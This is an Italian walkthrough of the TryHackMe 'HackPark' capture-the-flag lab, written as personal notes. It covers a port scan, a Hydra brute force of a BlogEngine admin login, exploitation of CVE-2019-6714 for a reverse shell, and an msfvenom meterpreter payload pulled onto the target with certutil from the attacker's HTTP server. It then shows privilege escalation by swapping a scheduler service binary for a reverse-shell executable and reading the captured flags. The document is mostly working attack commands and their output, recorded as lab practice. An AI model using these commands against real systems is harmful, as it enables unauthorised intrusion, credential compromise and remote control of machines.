
#tryhackmelabs #laboratorio 

https://tryhackme.com/r/room/hackpark

```
 nmap -sV -P -Pn -p- -v 10.10.131.80
```

```
Warning: The -P option is deprecated. Please use -PE
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 03:09 EST
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 03:09
Completed Parallel DNS resolution of 1 host. at 03:09, 0.02s elapsed
Initiating SYN Stealth Scan at 03:09
Scanning 10.10.131.80 [65535 ports]
Discovered open port 3389/tcp on 10.10.131.80
Discovered open port 80/tcp on 10.10.131.80
SYN Stealth Scan Timing: About 12.81% done; ETC: 03:13 (0:03:31 remaining)
SYN Stealth Scan Timing: About 40.34% done; ETC: 03:12 (0:01:30 remaining)
SYN Stealth Scan Timing: About 73.69% done; ETC: 03:11 (0:00:32 remaining)
Completed SYN Stealth Scan at 03:11, 111.99s elapsed (65535 total ports)
Initiating Service scan at 03:11
Scanning 2 services on 10.10.131.80
Completed Service scan at 03:12, 70.66s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.131.80.
Initiating NSE at 03:12
Completed NSE at 03:12, 0.27s elapsed
Initiating NSE at 03:12
Completed NSE at 03:12, 0.23s elapsed
Nmap scan report for 10.10.131.80
Host is up (0.050s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.58 seconds
           Raw packets sent: 131151 (5.771MB) | Rcvd: 111 (8.100KB)

```
visualizziamo
```
http://10.10.131.80/
```
salvare immagine e fare ricerca immagini inversa
```
https://images.google.com/
```
Come si chiama il clown visualizzato nella home page?
```
pennywise
```

Dobbiamo trovare una pagina di login da attaccare e identificare che tipo di richiesta il modulo sta facendo al webserver. In genere, i webserver fanno due tipi di richieste, una richiesta **GET** che viene usata per richiedere dati da un webserver e una richiesta **POST** che viene usata per inviare dati a un server.

Puoi controllare quale richiesta sta facendo un modulo cliccando con il tasto destro sul modulo di login, ispezionando l'elemento e poi leggendo il valore nel campo metodo. Puoi anche identificarlo se stai intercettando il traffico tramite BurpSuite (altri metodi HTTP possono essere trovati [qui](https://www.w3schools.com/tags/ref_httpmethods.asp) ).

```
http://10.10.131.80/Account/login.aspx?ReturnURL=/admin/
```
ispezioniamo il codice
```
<form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
```

Quale tipo di richiesta utilizza il modulo di accesso al sito Web di Windows?
```
POST
```

intercettiamo con burpsuite
```
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.131.80
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 563
Origin: http://10.10.131.80
Connection: keep-alive
Referer: http://10.10.131.80/Account/login.aspx?ReturnURL=/admin/
Upgrade-Insecure-Requests: 1

__VIEWSTATE=SDVOgAcc2bi7lFwyomjge%2FWcvUCC2Pf0vQ8P08Yb3JnS8YgdeCuuwwFd8regGiwu1b4fULsdk8Bkzruglna%2FJFZAlh93jPGd5mxuLl3%2B%2BacMW8QFanqWb33Yf%2Ff%2FX2E4mysSpY3VtfVerpMznqcXN%2ByHxvr35u9UsxTNMRFTpatVpBcd&__EVENTVALIDATION=9rtmtP3hCR7ASJqIUcp7Mnz9yg5UDa796jMEePKT6Y%2Bc%2BE1EWKSg%2Bd7%2BMlPWa7viyDYsrQXbJwts93s7wN%2B5j50oCsUzEdDiZdeVzKK161%2B8CtxF8Qk%2Bo8aaTc43ixQ7vLfOo3S6HHH1e2x5EGB82WwESYAMAfUQgAcNfTF3o3MM1jxE&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=123456&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```


```
hydra -l <nomeutente> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.131.80 http-post-form '/Account/login.aspx:__VIEWSTATE=9RhjEa3BtTcf%2BkfbOW9bfpeS%2BZReu3SfG912AiyXqwcEfw0bCBxJSEHTV1MoarhXqFVtErutkeBbRiHb%2B0opcHlgZgoGJGLfOPSfzDjMgPc3Xjqw6sZaMFXjA2ZQBHBUEdIxbO367QmonLBFq8Uz9YlkLmFFuggm%2FLXOeY9IWzdJdtoe9Q1bJwttW%2FPAwQuG9leJOUotBUixIJzdfJvN%2F1YCT0dbGDvzPKZR%2Fzkwbsc4s0SbvNBr9NJgHLighlsP1XFsy1VarihP4Xd9kSGOr2ef3TDoBXFk6TjT7i7xBU41%2BF0s8oMsOTXF2LXOxHr4kKO86Pobq9v8koxe88Ej%2BDsItdfmYouR1bOVupRYOvtrf6WL&__EVENTVALIDATION=fXym4Bx%2FFZEtjjBd5anYlUJ32X3V%2Fp%2FF9puhcMDEW3rO9jGOflpX3JUWcMjhgNvAjXAhr0sLl%2B54oRgib6M9I7J6IuiQS45suYpkbVQlbDRBi88ZHpp8dOuu1NrLInmlyUEaYt40ymVHHRR5qOJ6twuG3LAcWtL7LxL5cId3FeiD8wOA&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -f
```
oppure (cambia solo sintassi Login failed)
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.131.80 http-post-form '/Account/login.aspx:__VIEWSTATE=9RhjEa3BtTcf%2BkfbOW9bfpeS%2BZReu3SfG912AiyXqwcEfw0bCBxJSEHTV1MoarhXqFVtErutkeBbRiHb%2B0opcHlgZgoGJGLfOPSfzDjMgPc3Xjqw6sZaMFXjA2ZQBHBUEdIxbO367QmonLBFq8Uz9YlkLmFFuggm%2FLXOeY9IWzdJdtoe9Q1bJwttW%2FPAwQuG9leJOUotBUixIJzdfJvN%2F1YCT0dbGDvzPKZR%2Fzkwbsc4s0SbvNBr9NJgHLighlsP1XFsy1VarihP4Xd9kSGOr2ef3TDoBXFk6TjT7i7xBU41%2BF0s8oMsOTXF2LXOxHr4kKO86Pobq9v8koxe88Ej%2BDsItdfmYouR1bOVupRYOvtrf6WL&__EVENTVALIDATION=fXym4Bx%2FFZEtjjBd5anYlUJ32X3V%2Fp%2FF9puhcMDEW3rO9jGOflpX3JUWcMjhgNvAjXAhr0sLl%2B54oRgib6M9I7J6IuiQS45suYpkbVQlbDRBi88ZHpp8dOuu1NrLInmlyUEaYt40ymVHHRR5qOJ6twuG3LAcWtL7LxL5cId3FeiD8wOA&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed'
```

```
[80][http-post-form] host: 10.10.131.80   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-06 04:36:14
```

Indovina un nome utente, scegli un elenco di parole per la password e ottieni le credenziali di un account utente!
```
1qaz2wsx
```


Ora che hai effettuato l'accesso al sito web, riesci a identificare la versione di BlogEngine?
```
    </form>

    <!--- BlogEngine 3.3.6.0 -->
</body>
```
oppure in
```
http://10.10.192.195/admin/about.cshtml
```

```
3.3.6.0
```
Utilizzare l' [archivio del database degli exploit](http://www.exploit-db.com/)  per trovare un exploit che consenta di ottenere una reverse shell su questo sistema.

Che cosa è il CVE?
https://www.exploit-db.com/exploits/46353
```
CVE-2019-6714
```
Utilizzando l'exploit pubblico, ottieni l'accesso iniziale al server.

```
msfconsole
```

```
searchsploit blogengine
```

```
searchsploit -m 46353
```

```
nano 46353.cs
```
```
using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.11.116.149", 4445)) {
```

```
mv 46353.cs PostView.ascx
```

```
nc -nlvp 4445
```

```
http://10.10.226.170/?theme=../../App_Data/files
```

```
└─$ nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.11.116.149] from (UNKNOWN) [10.10.192.195] 49304
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
ls
c:\windows\system32\inetsrv>ls
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog

```
Come viene eseguito il webserver?
```
iis apppool\blog
```

La nostra sessione netcat è un po' instabile, quindi generiamo un'altra reverse shell usando msfvenom. da kali

```
sudo msfvenom -f exe -p windows/meterpreter/reverse_tcp LHOST=10.11.116.149 LPORT=4444 -e x64/shikata_ga_nai -o shellX.exe
```

```
python -m http.server 80
```

sul server vittima
```target
cd c:\Windows\Temp
```
```target
certutil -urlcache -f http://10.11.116.149/shellX.exe shellX.exe
```

da kali
```
msfconsole
```

```
search multi handler
```

```
use multi/handler
```

```
set payload windows/meterpreter/reverse_tcp
```

```
set LHOST 10.11.116.149
```

```
set LPORT 4444
```
ci mettiamo in ascolto
```
run
```

sulla macchina vittima eseguiamo il payload
```
shellX.exe
```

otteniamo la nostra reverse shell stabile
```
[*] Started reverse TCP handler on 10.11.116.149:4444 
[*] Sending stage (176198 bytes) to 10.10.226.170
[*] Meterpreter session 1 opened (10.11.116.149:4444 -> 10.10.226.170:49286) at 2025-01-07 05:34:09 -0500

meterpreter > 

```

```
sysinfo
```

```
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

Qui scaricheremo [WinPeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20231203-9cdcb38f) , quindi lo eseguiremo sul computer di destinazione.

```
wget "https://github.com/peass-ng/PEASS-ng/releases/download/20231203-9cdcb38f/winPEASx64.exe"
```

```
chmod +x winPEASx64.exe
```
```
pwd
```
```
/home/kali/Downloads/WinPrivEsc
```

Dopo aver scaricato winPEAS, è necessario caricarlo nel computer.

da meterpreter
```
upload /home/kali/Downloads/WinPrivEsc/winPEASx64.exe
```

```
shell
```

```
.\winPEASx64.exe
```

Qual è la versione del sistema operativo di questo computer Windows?
```
Windows 2012 R2 (6.3 Build 9600)
```
Qual è il nome del _servizio_ anomalo in esecuzione?
```
 WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running                                                                
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])                                                                              
    System Scheduler Service Wrapper

```
	risultato winPEAS
```
WindowsScheduler
```

```
cd C:\Program Files (x86)\SystemScheduler\Events
```

```
dir
```

```
type 20198415519.INI_LOG.txt
```
Qual è il nome del binario che dovresti sfruttare?
```
Message.exe
```
Utilizzando questo servizio anomalo, aumenta i tuoi privilegi!
```
cd C:\Program Files (x86)\SystemScheduler
```

da Kali
```
msfvenom -p windows/shell_reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.11.116.149 LPORT=1234 -f exe > Message.exe
```

```
nc -nlvp 1234
```

da meterpreter
```
cd "C:/Program Files (x86)/SystemScheduler"
```

```
mv Message.exe Message.old
```

```
upload /home/kali/Message.exe "C:\\Program Files (x86)\\SystemScheduler\\Message.exe"
```

**otteniamo la reverse shell con privilegi elevati in quanto Message.exe è stato eseguito come amministratore**
```
whoami
```

```
cd C:/Users/jeff/Desktop/
```

```
C:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
```

```
cd C:/Users/Administrator/Desktop/
```

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
7e1xxxxxxxxxxxxxxxxxxxxx
```
Utilizzando winPeas, qual era l'ora di installazione originale? (Data e ora)
```
systeminfo
```

```
Original Install Date:     8/3/2019, 10:43:23 AM
```

